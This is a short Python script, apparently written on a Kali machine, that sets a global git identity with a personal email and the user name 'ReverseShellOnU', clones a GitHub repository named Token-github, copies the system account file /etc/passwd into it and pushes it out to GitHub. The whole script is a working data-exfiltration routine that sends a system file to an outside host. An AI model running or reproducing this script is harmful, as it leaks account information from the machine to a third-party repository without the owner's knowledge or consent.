import os 
os.system('git config --global user.email "alberttventura@gmail.com"')     
os.system('git config --global user.name "ReverseShellOnU"')
os.chdir("/home/kali")
os.system("git clone git@github.com:ReverseShellOnU/Token-github.git")
os.system("cp /etc/passwd /home/kali/Token-github")
os.chdir("/home/kali/Token-github")
    
os.system("git init")
os.system("git add .")
os.system('git commit -m "/etc/passwd de Albert"')
os.system("git remote add origin git@github.com:ReverseShellOnU/Token-github.git")
os.system("git push -u origin main")
    
